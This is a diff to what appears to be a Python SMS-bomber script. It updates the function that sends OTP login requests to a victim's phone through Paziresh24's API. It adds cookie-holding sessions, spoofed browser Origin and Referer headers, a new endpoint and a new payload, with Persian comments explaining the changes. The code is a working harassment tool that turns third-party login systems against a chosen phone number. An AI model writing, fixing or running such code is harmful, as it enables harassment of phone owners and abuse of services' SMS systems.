@@ -67,24 +67,30 @@ def send_service_safe(service, phone):
 
 def paziresh24(phone):
     try:
-        # استفاده از فرمت 09123456789
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         formatted_phone = f"0{formatted_phone}"
+        
+        # استفاده از session برای حفظ cookies
+        session = requests.Session()
+        
+        # اول صفحه اصلی رو بگیریم
+        session.get("https://www.paziresh24.com/", timeout=10)
         
         headers = {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://www.paziresh24.com",
+            "Referer": "https://www.paziresh24.com/patient/"
         }
         
         payload = {
-            "mobile": formatted_phone,  # با فرمت 09123456789
-            "captcha": "",
-            "captcha_answer": ""
+            "username": formatted_phone,  # استفاده از username به جای mobile
+            "grant_type": "otp"
         }
         
-        response = requests.post(
-            "https://api.paziresh24.com/v1/auth/send-otp",
+        response = session.post(
+            "https://www.paziresh24.com/api/v1/auth/otp",
             json=payload,
             headers=headers,
             timeout=10,
@@ -95,22 +101,17 @@ def paziresh24(phone):
         print(f'{y}[paziresh24] Response: {response.text}{a}')
         
         if response.status_code == 200:
-            data = response.json()
-            if data.get("success"):
-                print(f'{g}(paziresh24) SMS sent successfully! ✅{a}')
-                return True
-            else:
-                print(f'{r}[-] paziresh24 failed: {data.get("message", "Unknown error")}{a}')
-                return False
+            print(f'{g}(paziresh24) SMS sent successfully! ✅{a}')
+            return True
         else:
-            print(f'{r}[-] paziresh24 http error: {response.status_code}{a}')
+            print(f'{r}[-] paziresh24 error: {response.status_code}{a}')
             return False
             
     except Exception as e:
         print(f'{r}[!] paziresh24 exception: {e}{a}')
         return False
-        
                 
+
 
 def tebinja(phone):
     try:
